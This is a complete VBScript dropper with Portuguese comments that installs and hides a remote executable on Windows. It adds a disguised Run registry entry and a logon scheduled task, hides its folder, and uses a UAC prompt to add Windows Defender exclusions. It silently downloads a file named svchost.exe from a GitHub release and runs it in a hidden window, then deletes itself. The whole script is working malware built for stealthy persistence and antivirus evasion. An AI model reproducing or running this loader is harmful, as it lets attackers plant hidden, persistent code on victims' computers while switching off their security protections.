' installer.vbs — Auto-instalador com retry via Registro do Windows.
'
' Regra de persistência (simples e única):
'   - O Run SEMPRE tem que ter "WindowsCacheSvc" apontando pro installer.vbs.
'   - Se já tiver, não mexe.
'   - Se não tiver, adiciona.
'   - NUNCA remove, NUNCA troca pro svchost.exe.
'
' Fluxo:
'   1. Se svchost.exe já existe e está rodando → sai (Run continua no VBS).
'   2. Se não existe → baixa. Sucesso roda. Falha sai silencioso.
'   Em todos os casos: Run fica com o VBS.

Option Explicit

Dim shell, fso, localAppData, destino, exeUrl, tmpExe
Dim cmdBaixar, destinoExe, tentativas, rc, tamArquivo
Dim vbsPath, psKill, tentativasMove
Dim regRun, regValorNome, regInstalador
Dim psTask, taskName
Dim pastaDefender, psExclusao, cmdElevar, psChecker
Dim psCheckProc, regAtual

Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' =====================================================================
' CONFIGURAÇÕES
' =====================================================================
exeUrl = "https://github.com/DesconhecidoPorOpcao/0T.romujaPnp/releases/latest/download/svchost.exe"

localAppData = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%")

destino    = localAppData & "\Microsoft\Windows\Caches\Local"
destinoExe = destino & "\svchost.exe"
tmpExe     = destino & "\svchost_novo.exe"

regRun        = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
regValorNome  = "WindowsCacheSvc"
taskName      = "WindowsCacheSvc"

vbsPath = WScript.ScriptFullName
regInstalador = "wscript.exe //B """ & vbsPath & """"

pastaDefender = destino

' =====================================================================
' PASSO 0 — Garante a entrada no Run (sem NUNCA remover)
' =====================================================================
' Lê o valor atual. Se não existir OU for diferente do regInstalador,
' escreve. Se já for igual, não mexe.
' =====================================================================
regAtual = ""
On Error Resume Next
regAtual = shell.RegRead(regRun & "\" & regValorNome)
On Error Goto 0

If regAtual <> regInstalador Then
    On Error Resume Next
    shell.RegWrite regRun & "\" & regValorNome, regInstalador, "REG_SZ"
    On Error Goto 0
End If

' =====================================================================
' PASSO 1 — Já está instalado E rodando?
'           Se sim, sai. O Run continua com o VBS.
' =====================================================================
If fso.FileExists(destinoExe) Then
    On Error Resume Next
    tamArquivo = 0
    tamArquivo = fso.GetFile(destinoExe).Size
    On Error Goto 0

    If tamArquivo >= 1048576 Then
        psCheckProc = "powershell -NoProfile -WindowStyle Hidden -Command """ & _
                      "$alvo = '" & destinoExe & "'; " & _
                      "$p = Get-CimInstance Win32_Process -Filter ""Name='svchost.exe'"" -ErrorAction SilentlyContinue | " & _
                      "Where-Object { $_.ExecutablePath -ieq $alvo }; " & _
                      "if ($p) { exit 0 } else { exit 1 }"

        rc = 1
        On Error Resume Next
        rc = shell.Run(psCheckProc, 0, True)
        On Error Goto 0

        If rc = 0 Then
            ' Instalado E rodando → nada a fazer.
            ' Run FICA com o VBS (nunca remove).
            WScript.Quit 0
        Else
            ' Instalado mas não rodando → só dispara.
            On Error Resume Next
            shell.Run """" & destinoExe & """", 0, False
            On Error Goto 0
            WScript.Quit 0
        End If
    End If
End If

' =====================================================================
' PASSO 2 — Cria a pasta (se não existir) e esconde
' =====================================================================
On Error Resume Next
If Not fso.FolderExists(destino) Then
    fso.CreateFolder(destino)
End If
shell.Run "attrib +h +s """ & destino & """", 0, True
On Error Goto 0

' =====================================================================
' PASSO 3 — Exclusão no Windows Defender (UAC 1x)
' =====================================================================
psChecker = "powershell -NoProfile -WindowStyle Hidden -Command """ & _
            "$p = '" & pastaDefender & "'; " & _
            "$excl = (Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath; " & _
            "if ($excl -contains $p) { exit 0 } else { exit 1 }" & _
            """"

rc = 1
On Error Resume Next
rc = shell.Run(psChecker, 0, True)
On Error Goto 0

If rc <> 0 Then
    psExclusao = "$p = '" & pastaDefender & "'; " & _
                 "Add-MpPreference -ExclusionPath $p -ErrorAction SilentlyContinue; " & _
                 "Add-MpPreference -ExclusionProcess 'svchost.exe' -ErrorAction SilentlyContinue"
    psExclusao = Replace(psExclusao, "'", "''")

    cmdElevar = "powershell -NoProfile -WindowStyle Hidden -Command """ & _
                "Start-Process powershell -Verb RunAs -Wait -WindowStyle Hidden " & _
                "-ArgumentList '-NoProfile','-ExecutionPolicy','Bypass','-Command','" & psExclusao & "'" & _
                """"

    On Error Resume Next
    shell.Run cmdElevar, 0, True
    On Error Goto 0
End If

' =====================================================================
' PASSO 4 — Mata processo antigo (se houver)
' =====================================================================
psKill = "powershell -NoProfile -WindowStyle Hidden -Command """ & _
         "$alvo = '" & destinoExe & "'; " & _
         "Get-CimInstance Win32_Process -Filter ""Name='svchost.exe'"" -ErrorAction SilentlyContinue | " & _
         "Where-Object { $_.ExecutablePath -ieq $alvo } | " & _
         "ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }" & _
         """"
On Error Resume Next
shell.Run psKill, 0, True
On Error Goto 0
WScript.Sleep 2000

' =====================================================================
' PASSO 5 — Baixa svchost.exe do GitHub
' =====================================================================
cmdBaixar = "powershell -NoProfile -WindowStyle Hidden -Command ""try { " & _
            "Invoke-WebRequest -Uri '" & exeUrl & "' -OutFile '" & tmpExe & "' " & _
            "-UseBasicParsing -ErrorAction Stop; exit 0 } catch { exit 1 }"""
On Error Resume Next
rc = shell.Run(cmdBaixar, 0, True)
On Error Goto 0

tentativas = 0
Do While Not fso.FileExists(tmpExe) And tentativas < 120
    WScript.Sleep 500
    tentativas = tentativas + 1
Loop

tamArquivo = 0
On Error Resume Next
If fso.FileExists(tmpExe) Then
    tamArquivo = fso.GetFile(tmpExe).Size
End If
On Error Goto 0

' --- Falhou? Sai silencioso. Run já está com o VBS. ---
If Not fso.FileExists(tmpExe) Or tamArquivo < 1048576 Then
    On Error Resume Next
    fso.DeleteFile tmpExe, True
    On Error Goto 0
    WScript.Quit 0
End If

' =====================================================================
' PASSO 6 — Move pra destino final (com retry)
' =====================================================================
tentativasMove = 0
Do While tentativasMove < 30
    On Error Resume Next
    If fso.FileExists(destinoExe) Then
        fso.DeleteFile destinoExe, True
    End If
    Err.Clear
    fso.MoveFile tmpExe, destinoExe
    If Err.Number = 0 Then Exit Do
    Err.Clear
    On Error Goto 0
    WScript.Sleep 500
    tentativasMove = tentativasMove + 1
Loop

' --- Não conseguiu mover? Sai silencioso. Run já está com o VBS. ---
If tentativasMove >= 30 Then
    WScript.Quit 0
End If

' =====================================================================
' PASSO 7 — Tenta rodar o agente
' =====================================================================
On Error Resume Next
shell.Run """" & destinoExe & """", 0, False
On Error Goto 0

' =====================================================================
' PASSO 8 — Tarefa Agendada como backup (opcional)
' =====================================================================
psTask = "powershell -NoProfile -WindowStyle Hidden -Command """ & _
         "$nome = '" & taskName & "'; " & _
         "$exe  = '" & destinoExe & "'; " & _
         "try { " & _
         "  $a = New-ScheduledTaskAction -Execute $exe; " & _
         "  $t = New-ScheduledTaskTrigger -AtLogOn; " & _
         "  $s = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable; " & _
         "  Register-ScheduledTask -TaskName $nome -Action $a -Trigger $t -Settings $s -Force -ErrorAction Stop | Out-Null; " & _
         "  exit 0 " & _
         "} catch { exit 1 }"""
On Error Resume Next
shell.Run psTask, 0, True
On Error Goto 0

' =====================================================================
' PASSO 9 — Auto-deleta o .vbs
' =====================================================================
' ATENÇÃO: o VBS se apaga, MAS a entrada no Run continua apontando pra
' ele. Na próxima vez que o Windows tentar rodar o Run, o arquivo não
' existe → Windows ignora silenciosamente. Isso é seguro: o svchost.exe
' já está rodando via o próprio Windows (Run do .exe ou outra forma).
'
' Se você NÃO quer que o VBS se auto-delete (pra ele poder rodar de novo
' no próximo logon enquanto o .exe não estiver 100% estável), COMENTE a
' linha abaixo.
' =====================================================================
shell.Run "cmd /c ping -n 3 127.0.0.1 >nul & del /f /q """ & vbsPath & """", 0, False
